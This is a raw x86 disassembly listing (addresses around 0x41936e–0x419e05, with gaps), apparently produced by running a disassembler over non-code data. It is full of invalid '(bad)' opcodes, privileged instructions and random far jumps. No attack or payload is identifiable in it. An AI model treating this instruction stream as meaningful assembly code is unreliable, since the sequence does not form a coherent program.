  41936e:	mov    esi,0x5894877e
  419373:	jg     0x41931b
  419375:	mov    ebx,0x75682686
  41937a:	xor    DWORD PTR [ecx],ecx
  41937c:	cmp    al,0xb7
  41937e:	push   ds
  41937f:	fst    DWORD PTR [edi+0x1e]
  419382:	iret   
  419383:	enter  0x3a63,0x8c
  419387:	xor    DWORD PTR [esp+ecx*8],esi
  41938a:	dec    edi
  41938b:	mov    al,BYTE PTR [eax]
  41938d:	rcl    DWORD PTR [ecx-0x5f],1
  419390:	fs sub eax,0x9c6b274
  419396:	pop    ebx
  419397:	mov    ebp,0xf868bc96
  41939c:	pop    ebx
  41939d:	xor    DWORD PTR [ecx-0x12b5bb81],esi
  4193a3:	adc    al,0x6a
  4193a5:	jecxz  0x419397
  4193a7:	sbb    dh,BYTE PTR [esi-0xa]
  4193aa:	jl     0x419405
  4193ac:	xlat   BYTE PTR ds:[ebx]
  4193ad:	sub    DWORD PTR [eax-0x1b07b036],esp
  4193b3:	add    bl,dl
  4193b5:	ret    
  4193b6:	cdq    
  4193b7:	xchg   al,dh
  4193b9:	sub    esp,esp
  4193bb:	es ret 0xed9f
  4193bf:	add    dh,BYTE PTR [ebp-0x7f]
  4193c2:	inc    ebx
  4193c3:	add    esi,ebp
  4193c5:	adc    eax,0xbe09ba04
  4193ca:	mov    bh,0xe5
  4193cc:	adc    DWORD PTR [ebx-0x3d],ebp
  4193cf:	push   0xceb61ed7
  4193d4:	icebp  
  4193d5:	aas    
  4193d6:	lahf   
  4193d7:	retf   
  4193d8:	jp     0x41942c
  4193da:	pop    esp
  4193db:	lock lds edx,FWORD PTR [esi-0x7e]
  4193df:	mov    al,ds:0x4a4d9b82
  4193e4:	arpl   WORD PTR [edx+0x7004c87a],si
  4193ea:	inc    edx
  4193eb:	call   0xa637:0x8572a17e
  4193f2:	mov    ebx,DWORD PTR [ecx-0x52]
  4193f5:	lods   eax,DWORD PTR ds:[esi]
  4193f6:	xor    eax,0x7cfd54c
  4193fb:	leave  
  4193fc:	out    0x93,al
  4193fe:	retf   
  4193ff:	jmp    FWORD PTR [ebx-0x27250c84]
  419405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419406:	sti    
  419407:	or     eax,0xad051884
  41940c:	sar    DWORD PTR [ebp-0x77],1
  41940f:	sbb    al,0xa8
  419411:	adc    al,BYTE PTR [ecx+0x39]
  419414:	sub    ch,BYTE PTR [edi+0x44655507]
  41941a:	mov    bh,0xff
  41941c:	dec    eax
  41941d:	dec    esi
  41941e:	mov    bl,0xd6
  419420:	daa    
  419421:	fsub   st,st(7)
  419423:	jp     0x4193ee
  419425:	pushf  
  419426:	jns    0x419445
  419428:	push   0xffffffd7
  41942a:	xor    al,0xa
  41942c:	pop    ecx
  41942d:	mov    edi,0x580cf09e
  419432:	dec    eax
  419433:	enter  0xddb8,0x4a
  419437:	stc    
  419438:	popa   
  419439:	into   
  41943a:	in     eax,0x48
  41943c:	in     al,dx
  41943d:	and    esi,DWORD PTR [eax-0x15b293ab]
  419443:	sub    al,0x45
  419445:	rcr    BYTE PTR [ebx+0x3e9b750d],1
  41944b:	jae    0x4194c9
  41944d:	outs   dx,BYTE PTR ds:[esi]
  41944e:	jnp    0x419478
  419450:	jecxz  0x4194b1
  419452:	jecxz  0x41944f
  419454:	or     eax,0xd0e179fa
  419459:	mov    edx,0xa0497fd5
  41945e:	fsub   DWORD PTR [ebx+0x72]
  419461:	int    0x7d
  419463:	or     dh,BYTE PTR [ebx-0x24]
  419466:	test   eax,0xb48d48aa
  41946b:	push   eax
  41946c:	ja     0x41946e
	...
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	add    ecx,esp
  4194e4:	scas   al,BYTE PTR es:[edi]
  4194e5:	xchg   ecx,eax
  4194e6:	adc    BYTE PTR cs:[ecx],al
  4194e9:	add    bh,bh
  4194eb:	add    BYTE PTR [eax],al
  4194ed:	add    cl,dh
  4194ef:	(bad)  
  4194f0:	dec    edx
  4194f1:	and    al,0xad
  4194f3:	cmp    BYTE PTR [ebp+0x13c9f101],dh
  4194f9:	push   ecx
  4194fa:	stos   BYTE PTR es:[edi],al
  4194fb:	out    dx,eax
  4194fc:	push   ebx
  4194fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194fe:	xor    BYTE PTR [eax],dl
  419500:	mov    dl,0x7d
  419502:	cmp    esp,DWORD PTR [edx-0x38]
  419505:	xchg   DWORD PTR [edi+0x62],edx
  419508:	cmp    al,0x6c
  41950a:	push   esp
  41950b:	aad    0x82
  41950d:	mov    esp,esp
  41950f:	sbb    al,0xb9
  419511:	int3   
  419512:	movups xmm5,XMMWORD PTR [ebp+0x2d]
  419516:	xchg   dl,dh
  419518:	mov    edx,esp
  41951a:	in     al,dx
  41951b:	push   eax
  41951c:	inc    edx
  41951d:	and    al,0xb0
  41951f:	inc    esp
  419520:	test   al,0x9a
  419522:	aam    0xd7
  419524:	std    
  419525:	cdq    
  419526:	pop    ecx
  419527:	loope  0x4194fa
  419529:	rcr    BYTE PTR [edi],cl
  41952b:	ret    
  41952c:	and    eax,0xeee69eb
  419531:	jge    0x419587
  419533:	hlt    
  419534:	add    BYTE PTR [eax-0x32589436],0xd0
  41953b:	push   ss
  41953c:	aas    
  41953d:	icebp  
  41953e:	sub    bh,BYTE PTR [ebx+eax*4]
  419541:	pop    edx
  419542:	stos   DWORD PTR es:[edi],eax
  419543:	aad    0x42
  419545:	cmp    dl,cl
  419547:	int3   
  419548:	adc    BYTE PTR gs:[edi-0x4d],dl
  41954c:	jne    0x419594
  41954e:	push   esp
  41954f:	aas    
  419550:	xchg   cl,bl
  419552:	mov    esp,0x347dcf7
  419557:	daa    
  419558:	sbb    eax,0xdbde7b72
  41955d:	add    bl,BYTE PTR [edx]
  41955f:	ja     0x41954a
  419561:	je     0x4194ed
  419563:	outs   dx,DWORD PTR ds:[esi]
  419564:	mov    WORD PTR [ecx-0x50],es
  419567:	sub    al,0x28
  419569:	push   ebp
  41956a:	xchg   BYTE PTR [eax+0x31e11f32],al
  419570:	loope  0x419583
  419572:	dec    BYTE PTR [ecx+0xb]
  419575:	test   DWORD PTR [ecx],ebx
  419577:	and    eax,0x8dd250c2
  41957c:	(bad)  
  41957d:	sub    esp,ebx
  41957f:	shl    dl,1
  419581:	jmp    0x329d:0x54d88594
  419588:	push   ds
  419589:	push   es
  41958a:	mov    DWORD PTR [ebx],esp
  41958c:	pop    ss
  41958d:	jnp    0x419523
  41958f:	and    eax,0xaffba962
  419594:	cli    
  419595:	mov    DWORD PTR [edi+0x6fc6aeb2],ebp
  41959b:	adc    cl,BYTE PTR [esi]
  41959d:	mov    ecx,0xf8932ab3
  4195a2:	push   esp
  4195a3:	sub    eax,DWORD PTR [edi-0x27]
  4195a6:	test   al,0xb0
  4195a8:	add    al,0xad
  4195aa:	fsqrt  
  4195ac:	mov    BYTE PTR [edx-0x7d239236],bl
  4195b2:	fucomip st,st(3)
  4195b4:	mov    eax,ds:0xd6fedb83
  4195b9:	dec    edx
  4195ba:	mov    eax,0x95c59dcb
  4195bf:	mov    DWORD PTR [ebp+edi*4+0x67],ebx
  4195c3:	pusha  
  4195c4:	jnp    0x419567
  4195c6:	das    
  4195c7:	bound  esi,QWORD PTR [eax]
  4195c9:	xchg   ebp,eax
  4195ca:	jo     0x4195e2
  4195cc:	hlt    
  4195cd:	(bad)  
  4195ce:	xchg   esi,eax
  4195cf:	mov    ss,WORD PTR [ecx-0x14952174]
  4195d5:	(bad)  
  4195d6:	call   0x80c1:0xf4dbb9fa
  4195dd:	pop    ebx
  4195de:	and    BYTE PTR [edi-0x56],0xff
  4195e2:	sub    eax,0x777372fc
  4195e7:	call   0xdc:0x5b7ee09
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	outs   dx,BYTE PTR ds:[esi]
  419663:	ds nop
  419665:	shr    BYTE PTR ds:0xff000111,cl
  41966b:	add    BYTE PTR [eax],al
  41966d:	add    BYTE PTR [ebx+eax*1+0x9],ch
  419671:	jno    0x419633
  419673:	je     0x4196c5
  419675:	sbb    cl,BYTE PTR [eax]
  419677:	shl    BYTE PTR [ebx-0x31bdd979],cl
  41967d:	fcmovnu st,st(4)
  41967f:	aam    0xb
  419681:	mov    ds:0x79c52244,eax
  419686:	fisubr DWORD PTR [ebp-0x46175b65]
  41968c:	xor    BYTE PTR [edi],0x96
  41968f:	mov    ebp,0x8fd37955
  419694:	lahf   
  419695:	imul   edi,DWORD PTR [edx-0xf982cde],0xc9792348
  41969f:	mov    DWORD PTR [edx+0xa],esi
  4196a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a3:	and    al,0xec
  4196a5:	retf   0xadfd
  4196a8:	adc    al,0x8b
  4196aa:	cmp    ecx,DWORD PTR [ebx]
  4196ac:	xchg   ecx,eax
  4196ad:	aas    
  4196ae:	sub    bh,BYTE PTR [ecx-0x4df5f7b3]
  4196b4:	retf   
  4196b5:	pop    esi
  4196b6:	pop    ebp
  4196b7:	pop    esi
  4196b8:	adc    ch,BYTE PTR [esi]
  4196ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196bb:	dec    ebp
  4196bc:	push   edi
  4196bd:	pop    esp
  4196be:	sub    BYTE PTR [ecx-0xa],al
  4196c1:	dec    ebx
  4196c2:	inc    ebp
  4196c3:	js     0x41972f
  4196c5:	pushf  
  4196c6:	mov    dl,0x5c
  4196c8:	mov    ch,0x77
  4196ca:	adc    ebp,DWORD PTR [ebx]
  4196cc:	add    al,0x71
  4196ce:	xchg   esp,eax
  4196cf:	cld    
  4196d0:	daa    
  4196d1:	sti    
  4196d2:	pop    eax
  4196d3:	push   edx
  4196d4:	xlat   BYTE PTR ds:[ebx]
  4196d5:	call   0xb88c0990
  4196da:	add    cl,dl
  4196dc:	(bad)  
  4196de:	scas   al,BYTE PTR es:[edi]
  4196df:	or     DWORD PTR [esi],ebp
  4196e1:	out    dx,al
  4196e2:	pushf  
  4196e3:	(bad)  
  4196e4:	icebp  
  4196e5:	pop    eax
  4196e6:	leave  
  4196e7:	cwde   
  4196e8:	mov    ecx,0xe8aa52a8
  4196ed:	lods   al,BYTE PTR ds:[esi]
  4196ee:	jne    0x419761
  4196f0:	fiadd  WORD PTR [eax-0x130be692]
  4196f6:	test   al,0x56
  4196f8:	and    BYTE PTR [edx+0x276de2d2],al
  4196fe:	lods   al,BYTE PTR ds:[esi]
  4196ff:	aaa    
  419700:	(bad)  
  419701:	add    DWORD PTR [ebp+0x29c40c09],ebp
  419707:	mov    WORD PTR [esi+0x397e9e36],ss
  41970d:	repnz fucomp st(6)
  419710:	out    0x49,al
  419712:	sub    eax,0x6f67a4f3
  419717:	xchg   esi,eax
  419718:	jg     0x4196ea
  41971a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41971b:	sub    DWORD PTR [ecx+0x15d0a722],ebx
  419721:	clc    
  419722:	mov    DWORD PTR [edi],0x7b8cd3f3
  419728:	lods   al,BYTE PTR ds:[esi]
  419729:	(bad)  
  41972a:	(bad)  
  41972b:	inc    eax
  41972c:	mov    ecx,0xced7e049
  419731:	lock gs call 0x9af1:0xf3152eb3
  41973a:	mov    DWORD PTR [ebp+0x169da11b],edi
  419740:	mov    edi,0x2a7fe6ba
  419745:	mov    ebp,0x4836b97f
  41974a:	ins    DWORD PTR es:[edi],dx
  41974b:	inc    esi
  41974c:	mov    ?,WORD PTR [esi-0x4de30cae]
  419752:	and    bl,BYTE PTR ds:0xd932cd01
  419758:	and    edi,DWORD PTR [edi-0x20]
  41975b:	pop    ds
  41975c:	ss dec esp
  41975e:	loop   0x4196ea
  419760:	inc    edx
  419761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419763:	sub    eax,0x232412aa
  419768:	aas    
  419769:	xor    eax,0x5d45a9
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0x1f8dd0ae
  4197e3:	jno    0x4197f5
  4197e5:	out    0x2c,eax
  4197e7:	adc    al,BYTE PTR [ecx]
  4197e9:	add    bh,bh
  4197eb:	add    BYTE PTR [eax],al
  4197ed:	add    BYTE PTR [esi+ecx*1-0x22],ch
  4197f1:	adc    esp,ebp
  4197f3:	ss adc eax,0x7b26a926
  4197f9:	fcom   DWORD PTR [eax]
  4197fb:	xor    DWORD PTR [ecx+0x47],0xf0281948
  419802:	loop   0x419786
  419804:	sahf   
  419805:	dec    ecx
  419806:	hlt    
  419807:	lds    edi,FWORD PTR [ebx+ebp*4]
  41980a:	daa    
  41980b:	ret    
  41980c:	inc    edx
  41980d:	jmp    0xf6d62442
  419812:	jmp    0x41983b
  419814:	xor    al,0x22
  419816:	adc    ah,bl
  419818:	xor    BYTE PTR [edx-0x1230fed2],bl
  41981e:	jb     0x41985c
  419820:	fabs   
  419822:	cmp    DWORD PTR [ecx+edi*4-0x44e7f20a],ebp
  419829:	pop    ds
  41982a:	dec    edx
  41982b:	sub    al,0xdd
  41982d:	les    edi,FWORD PTR [esp+edi*4+0x2c]
  419831:	call   0x165a:0x5625b359
  419838:	shr    BYTE PTR [esi-0x6d],0x5
  41983c:	out    dx,eax
  41983d:	or     al,0x80
  41983f:	fild   QWORD PTR [ebp-0x2d]
  419842:	xchg   edx,eax
  419843:	int    0x21
  419845:	sbb    BYTE PTR [edx-0x66],dh
  419848:	out    0x74,al
  41984a:	mov    bh,0x75
  41984c:	add    eax,0x5efc01b6
  419851:	and    DWORD PTR [ebx+ebp*8-0x10d807ca],ebp
  419858:	fistp  QWORD PTR [edx-0x50]
  41985b:	mov    dl,0x7c
  41985d:	imul   edx,ebp,0xffffffca
  419860:	dec    ebp
  419861:	xchg   esp,eax
  419862:	ins    BYTE PTR es:[edi],dx
  419863:	stos   DWORD PTR es:[edi],eax
  419864:	add    cl,ch
  419866:	jae    0x4197f2
  419868:	xor    esp,eax
  41986a:	ror    BYTE PTR [esi+esi*4],1
  41986d:	sbb    DWORD PTR [ecx],ebp
  41986f:	stc    
  419870:	mov    BYTE PTR [esi],dl
  419872:	add    dl,bl
  419874:	sbb    ah,dh
  419876:	pop    ecx
  419877:	je     0x419816
  419879:	call   0xbace:0x79b380dd
  419880:	jmp    0x419845
  419882:	fld    DWORD PTR ds:0x4e0effbd
  419888:	mov    ebp,0xbe9944d9
  41988d:	and    al,0x16
  41988f:	add    edi,DWORD PTR [edx+eiz*8+0xf54bf12]
  419896:	nop
  419897:	retf   0x3d2a
  41989a:	jecxz  0x419862
  41989c:	mov    bl,0x30
  41989e:	sahf   
  41989f:	pop    ebx
  4198a0:	pop    edi
  4198a1:	jbe    0x4198d5
  4198a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198a4:	and    DWORD PTR [esi-0x67cd3aad],ecx
  4198aa:	inc    eax
  4198ab:	sti    
  4198ac:	adc    cl,BYTE PTR [esi-0x37815e84]
  4198b2:	push   ss
  4198b3:	fcmovu st,st(5)
  4198b5:	jmp    0x58f1:0x7ec9c216
  4198bc:	xchg   edx,eax
  4198bd:	fwait
  4198be:	jp     0x4198bc
  4198c0:	dec    ebx
  4198c1:	and    al,0xea
  4198c3:	or     DWORD PTR [ebp+0x5cda1c58],ebp
  4198c9:	adc    DWORD PTR [edx],edx
  4198cb:	inc    ecx
  4198cc:	cli    
  4198cd:	ret    0x61f0
  4198d0:	mov    ebp,ecx
  4198d2:	ins    DWORD PTR es:[edi],dx
  4198d3:	xchg   edi,eax
  4198d4:	jmp    0x59f1207b
  4198d9:	loope  0x41992b
  4198db:	out    0xbd,al
  4198dd:	fistp  DWORD PTR [ebx+eiz*8]
  4198e0:	push   esp
  4198e1:	jns    0x419892
  4198e3:	mov    al,ds:0x9e63ac87
  4198e8:	cdq    
  4198e9:	jbe    0x419922
  4198eb:	aaa    
  4198ec:	fld    QWORD PTR [eax]
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnstsw WORD PTR [ecx-0x43]
  419964:	test   BYTE PTR [edi+0x2b],ch
  419967:	adc    eax,DWORD PTR [ecx]
  419969:	add    bh,bh
  41996b:	add    BYTE PTR [eax],al
  41996d:	add    BYTE PTR [esi*8-0x26258f24],ah
  419974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419975:	or     ecx,ebx
  419977:	pop    esi
  419978:	adc    eax,0x881d73e2
  41997d:	adc    bh,BYTE PTR [ebp-0x23aede9d]
  419983:	mov    ch,0x67
  419985:	imul   DWORD PTR [ebp-0x5ee060b0]
  41998b:	or     ebx,esi
  41998d:	mov    edi,0xa9f90db
  419992:	sahf   
  419993:	icebp  
  419994:	nop
  419995:	repz mov edx,0xd835bda1
  41999b:	das    
  41999c:	pop    ecx
  41999d:	dec    esp
  41999e:	retf   
  41999f:	push   esp
  4199a0:	cwde   
  4199a1:	push   ds
  4199a2:	retf   0xf813
  4199a5:	pop    edi
  4199a6:	cmp    cl,BYTE PTR [eax-0x1f]
  4199a9:	(bad)  
  4199aa:	mov    ds:0x53129764,al
  4199af:	int    0x27
  4199b1:	sub    al,0x36
  4199b3:	arpl   WORD PTR [ebx],sp
  4199b5:	sbb    ebp,DWORD PTR [ecx+ebp*2+0x4daf65c0]
  4199bc:	stos   BYTE PTR es:[edi],al
  4199bd:	pop    edi
  4199be:	inc    edi
  4199bf:	fsubr  st,st(1)
  4199c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c2:	mov    eax,0x5b1be2dc
  4199c7:	lods   al,BYTE PTR ds:[esi]
  4199c8:	call   0x53e1:0x465a39d9
  4199cf:	sbb    BYTE PTR [esi+edi*8],0x5a
  4199d3:	cli    
  4199d4:	mov    eax,0x2d480f5f
  4199d9:	mov    edx,0xaaf33a7a
  4199de:	sub    ebx,edx
  4199e0:	mov    cl,BYTE PTR [esi-0x6d]
  4199e3:	scas   al,BYTE PTR es:[edi]
  4199e4:	iret   
  4199e5:	pop    esp
  4199e6:	push   cs
  4199e7:	aaa    
  4199e8:	add    ch,BYTE PTR [ebp-0x78]
  4199eb:	icebp  
  4199ec:	and    dh,BYTE PTR [ecx+0x57]
  4199ef:	scas   al,BYTE PTR es:[edi]
  4199f0:	lods   al,BYTE PTR ds:[esi]
  4199f1:	rol    edx,0x49
  4199f4:	xor    cl,BYTE PTR fs:[eax+0x1935ff4a]
  4199fb:	das    
  4199fc:	sub    BYTE PTR [edx+edi*2+0xddddeb3],al
  419a03:	lods   eax,DWORD PTR ds:[esi]
  419a04:	out    dx,al
  419a05:	cs mov esi,0xe819202d
  419a0b:	popa   
  419a0c:	or     edx,DWORD PTR ds:0x651e8c90
  419a12:	dec    edx
  419a13:	outs   dx,DWORD PTR ds:[esi]
  419a14:	cmp    DWORD PTR [edx+0x1b414a6b],edx
  419a1a:	add    bh,BYTE PTR [ecx]
  419a1c:	ss mov ebp,0xa5faf4aa
  419a22:	mov    dh,0x59
  419a24:	xchg   ebx,eax
  419a25:	cdq    
  419a26:	pop    edi
  419a27:	mov    dl,0x2
  419a29:	loop   0x4199ad
  419a2b:	jle    0x419a93
  419a2d:	cli    
  419a2e:	pusha  
  419a2f:	xchg   ecx,eax
  419a30:	and    al,BYTE PTR [edi]
  419a32:	enter  0xe41,0xaf
  419a36:	add    DWORD PTR [esi-0x187fc9f3],edi
  419a3c:	xor    ebp,0x35
  419a3f:	rcl    DWORD PTR [ebx+edx*1-0x33],0x66
  419a44:	into   
  419a45:	mov    ebx,gs
  419a47:	loopne 0x4199d2
  419a49:	xlat   BYTE PTR ds:[ebx]
  419a4a:	sub    al,0x68
  419a4c:	xor    al,BYTE PTR [edi+0x3a]
  419a4f:	ins    DWORD PTR es:[edi],dx
  419a50:	aas    
  419a51:	das    
  419a52:	jo     0x4199e1
  419a54:	mov    ecx,0xf5ef6755
  419a59:	jno    0x4199dd
  419a5b:	mov    eax,0x2e27b278
  419a60:	or     DWORD PTR [edi-0x77],ebx
  419a63:	and    eax,0x2678e3c9
  419a68:	shl    BYTE PTR [edi+ebp*1+0x4d63],cl
	...
  419ad3:	add    BYTE PTR [eax],al
  419ad5:	add    BYTE PTR [ebx],dh
  419ad7:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419add:	test   ebx,0xc3c215d3
  419ae3:	(bad)  
  419ae4:	sub    DWORD PTR [edx+ebp*1-0xfffeec],edx
  419aeb:	add    BYTE PTR [eax],al
  419aed:	add    BYTE PTR [esi+0x331984b],bh
  419af3:	mov    ebp,0xc667e3a8
  419af8:	xor    al,0xd
  419afa:	mov    dh,0xd7
  419afc:	in     al,0x84
  419afe:	mov    ebx,DWORD PTR [ecx]
  419b00:	call   0xa21283b1
  419b05:	mov    edx,0x63d2b834
  419b0a:	xchg   ebp,eax
  419b0b:	pop    ecx
  419b0c:	xchg   esi,eax
  419b0d:	int    0xef
  419b0f:	pop    esi
  419b10:	mov    edx,0x30b350be
  419b15:	popw   ds
  419b17:	ret    0xb6bf
  419b1a:	gs push ebx
  419b1c:	cli    
  419b1d:	ret    
  419b1e:	jl     0x419ac2
  419b20:	sbb    al,0x14
  419b22:	dec    ecx
  419b23:	cmp    DWORD PTR [esi+0x49317ab5],0x6a
  419b2a:	adc    eax,0xd4fe43f
  419b2f:	pop    edx
  419b30:	hlt    
  419b31:	test   ch,dl
  419b33:	inc    edi
  419b34:	test   DWORD PTR [eax+0x3c],edx
  419b37:	push   0x7
  419b39:	cwde   
  419b3a:	les    edi,FWORD PTR [edx]
  419b3c:	imul   ebx,DWORD PTR [ebp+0x328a6785],0x26f43877
  419b46:	stc    
  419b47:	pop    esi
  419b48:	pop    ebx
  419b49:	xchg   edi,eax
  419b4a:	fist   DWORD PTR [eax-0x7d9a12d]
  419b50:	aam    0xaa
  419b52:	dec    edi
  419b53:	push   edi
  419b54:	mov    dh,0x3b
  419b56:	xor    ecx,DWORD PTR ds:0xa8fa78a3
  419b5c:	mov    edi,0x64d9d7b9
  419b61:	stc    
  419b62:	xor    eax,0x8d3de432
  419b67:	mov    edx,0x614e4097
  419b6c:	repz or eax,0x57d224e1
  419b72:	xchg   ecx,eax
  419b73:	test   edi,edx
  419b75:	repnz stc 
  419b77:	loop   0x419b0a
  419b79:	add    ecx,DWORD PTR [edi-0x6e]
  419b7c:	(bad)  [ebx+ebp*8-0x19]
  419b80:	int3   
  419b81:	and    ah,bh
  419b83:	adc    bl,0xa7
  419b86:	inc    eax
  419b87:	in     eax,dx
  419b88:	xlat   BYTE PTR ds:[ebx]
  419b89:	test   al,0xf7
  419b8b:	add    al,0x16
  419b8d:	jge    0x419b8a
  419b8f:	and    BYTE PTR [ebx],al
  419b91:	mov    ds:0x53adfe64,eax
  419b96:	inc    eax
  419b97:	pop    esp
  419b98:	mov    edx,DWORD PTR [esi-0x5b]
  419b9b:	jns    0x419b76
  419b9d:	and    eax,0x907cd369
  419ba2:	scas   al,BYTE PTR es:[edi]
  419ba3:	cmp    bl,dh
  419ba5:	outs   dx,DWORD PTR ds:[esi]
  419ba6:	pop    ds
  419ba7:	fnstcw WORD PTR [edi]
  419ba9:	nop
  419baa:	and    eax,0xc3d1743a
  419baf:	cmp    al,0xbd
  419bb1:	in     al,dx
  419bb2:	jo     0x419bef
  419bb4:	lods   eax,DWORD PTR ds:[esi]
  419bb5:	out    dx,al
  419bb6:	mov    al,0xe1
  419bb8:	push   ss
  419bb9:	imul   eax,DWORD PTR [edi-0x66eb2c7],0xffffffc7
  419bc0:	out    dx,al
  419bc1:	jecxz  0x419b52
  419bc3:	dec    eax
  419bc4:	test   BYTE PTR [eax],ah
  419bc6:	or     al,0x71
  419bc8:	xchg   esp,eax
  419bc9:	inc    ebp
  419bca:	xlat   BYTE PTR ds:[ebx]
  419bcb:	jmp    0x419bd2
  419bcd:	push   0x5f8bed73
  419bd2:	mov    DWORD PTR [edi+0x7525f88c],esp
  419bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bd9:	cmp    eax,DWORD PTR [esi]
  419bdb:	lds    edx,FWORD PTR [edx+0x4ccbc897]
  419be1:	push   es
  419be2:	jmp    0x64c8e572
  419be7:	(bad)  
  419be9:	repnz and ecx,0x28
	...
  419c54:	add    BYTE PTR [eax],al
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xb4
  419c63:	outs   dx,BYTE PTR ds:[esi]
  419c64:	dec    edx
  419c65:	ja     0x419c90
  419c67:	adc    eax,0xff0001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	xchg   esi,eax
  419c6f:	dec    bl
  419c71:	or     eax,0xe6689585
  419c76:	or     ebp,ebx
  419c78:	call   DWORD PTR [ecx-0x5f99c666]
  419c7e:	popf   
  419c7f:	push   0xb2d0af1a
  419c84:	mov    ebx,0x40c79c71
  419c89:	sub    DWORD PTR [eax+0x4d],ebx
  419c8c:	imul   ebp,DWORD PTR [edx-0x38b2ee9e],0x32
  419c93:	iret   
  419c94:	test   DWORD PTR [ecx],esp
  419c96:	aas    
  419c97:	std    
  419c98:	inc    ecx
  419c99:	push   ecx
  419c9a:	inc    edi
  419c9b:	fsub   QWORD PTR [esi-0xf]
  419c9e:	sub    al,0xa1
  419ca0:	fwait
  419ca1:	test   BYTE PTR [ebx+0x7f],dh
  419ca4:	jnp    0x419cc9
  419ca6:	mov    ch,0xea
  419ca8:	data16 out dx,al
  419caa:	fiadd  DWORD PTR [edx+0x34]
  419cad:	push   esp
  419cae:	sbb    BYTE PTR [edx+0x45],ah
  419cb1:	subps  xmm2,XMMWORD PTR [esi+0xbffebe4]
  419cb8:	ret    0x20f6
  419cbb:	push   ss
  419cbc:	js     0x419d0f
  419cbe:	cdq    
  419cbf:	std    
  419cc0:	test   DWORD PTR [eax-0x47e18c8e],edx
  419cc6:	jnp    0x419cf6
  419cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cc9:	gs lahf 
  419ccb:	pushf  
  419ccc:	(bad)  
  419cce:	idiv   DWORD PTR [edx]
  419cd0:	xor    BYTE PTR [ebp-0x3c846cec],0x72
  419cd7:	mov    dh,0xae
  419cd9:	push   cs
  419cda:	cmp    ebx,DWORD PTR [ebp+0x52]
  419cdd:	add    DWORD PTR [esi],ebx
  419cdf:	ja     0x419c8c
  419ce1:	int3   
  419ce2:	jp     0x419d4a
  419ce4:	mov    cl,0xe9
  419ce6:	mov    edi,0x2cae660f
  419ceb:	and    bl,BYTE PTR [ebx]
  419ced:	mov    ?,WORD PTR [edi-0x22]
  419cf0:	in     eax,0xe0
  419cf2:	mov    ebp,0xa4ec208c
  419cf7:	sti    
  419cf8:	dec    eax
  419cf9:	stc    
  419cfa:	cld    
  419cfb:	jge    0x419ce0
  419cfd:	(bad)  [esp+eiz*2-0x5dd18a4a]
  419d04:	popa   
  419d05:	and    BYTE PTR [eax],dh
  419d07:	mov    esi,0xd3363984
  419d0c:	sbb    DWORD PTR [ebx+0x4de52e98],edi
  419d12:	dec    esp
  419d13:	ror    DWORD PTR [edx],0x37
  419d16:	jge    0x419cb4
  419d18:	test   eax,0x8b32a679
  419d1d:	call   0x9b7982fc
  419d22:	add    al,0xbe
  419d24:	inc    edi
  419d25:	sbb    esi,ebp
  419d27:	fwait
  419d28:	mov    esi,0xf582928f
  419d2d:	xlat   BYTE PTR ds:[ebx]
  419d2e:	test   DWORD PTR [ecx],0x98e8da98
  419d34:	cs pop ds
  419d36:	jp     0x419d88
  419d38:	ret    0x7dcb
  419d3b:	ret    
  419d3c:	jae    0x419d34
  419d3e:	sub    ch,dl
  419d40:	lds    ebp,FWORD PTR [eax+0x29]
  419d43:	adc    ebp,ebx
  419d45:	and    DWORD PTR [esi],0xd55427a7
  419d4b:	xchg   edx,eax
  419d4c:	mov    cl,dl
  419d4e:	jle    0x419d75
  419d50:	pop    esi
  419d51:	mov    DWORD PTR [edi+0x60],0xb491aeda
  419d58:	inc    edi
  419d59:	xchg   ebp,eax
  419d5a:	mov    cl,0x58
  419d5c:	or     al,0xf8
  419d5e:	pop    ecx
  419d5f:	dec    ebp
  419d60:	fwait
  419d61:	sub    al,0x7e
  419d63:	and    ebp,DWORD PTR [ebx-0x54fb9c8]
  419d69:	xor    al,0x49
  419d6b:	xchg   esi,eax
  419d6c:	sub    BYTE PTR [eax],al
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fisub  DWORD PTR ss:[edi+0x2a]
  419de4:	je     0x419e2a
  419de6:	sub    BYTE PTR [esi],dl
  419de8:	add    DWORD PTR [eax],eax
  419dea:	inc    DWORD PTR [eax]
  419dec:	add    BYTE PTR [eax],al
  419dee:	push   ecx
  419def:	mov    al,ds:0x195a5722
  419df4:	adc    bl,BYTE PTR [esi]
  419df6:	jg     0x419dd5
  419df8:	inc    ebx
  419df9:	inc    esi
  419dfa:	mov    esp,0x8ccdb68c
  419dff:	dec    ebp
  419e00:	jmp    0xf322792d
  419e05:	scas   al,BYTE PTR es:[edi]
